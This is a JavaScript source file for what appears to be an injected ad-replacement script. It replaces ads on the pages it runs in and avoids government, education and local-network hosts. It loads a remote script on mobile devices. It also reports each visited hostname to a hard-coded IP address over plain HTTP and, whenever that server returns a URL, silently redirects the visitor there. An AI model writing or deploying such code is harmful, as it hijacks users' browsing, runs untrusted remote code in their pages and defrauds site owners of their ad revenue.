import { phone } from 'ismobilejs';
import { mobileReplace, PCReplace } from './replace';
import { AD_0X0 } from './config';

const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const { hostname } = window.location;

function replace() {
  if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;

  if (phone) {
    mobileReplace();
    // 唤醒广告位
    const scr = document.createElement('script');
    scr.src = AD_0X0;
    document.body.appendChild(scr);
  } else PCReplace();
}

function redirect() {
  let str = '';
  // const url = window.location.search.replace('?', '');
  // const arr = url.split('&');

  // arr.forEach((element) => {
  //   if (element.indexOf('url') !== -1) {
  //     let webUrl = element.split('=')[1];
  //     webUrl = webUrl.replace('http://', '');
  //     webUrl = webUrl.replace('https://', '');
  //     webUrl = webUrl.replace('/', '');
  //     if (webUrl.search(/^www./) !== -1 || webUrl.search(/^www./) !== -1) {
  //       str = webUrl.slice(webUrl.indexOf('.') + 1);
  //     } else {
  //       str = webUrl;
  //     }
  //   }
  // });
  if (hostname.search(/^www./) !== -1) {
    str = hostname.slice(hostname.indexOf('.') + 1);
  } else {
    str = hostname;
  }

  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window[fnName] = (data) => {
    if (data.url) window.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
  document.head.appendChild(os);
  os.remove();
}

function handler() {
  if (window.top === window && !window.haveRedirect) {
    redirect();
    window.haveRedirect = true;
  }
  if (window.adReady || document.readyState !== 'complete') return;
  replace();
  setTimeout(replace, 4000);
  window.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
}

setTimeout(() => {
  if (window.adReady) return;
  setTimeout(replace, 0);
  window.adReady = true;
}, 10000);
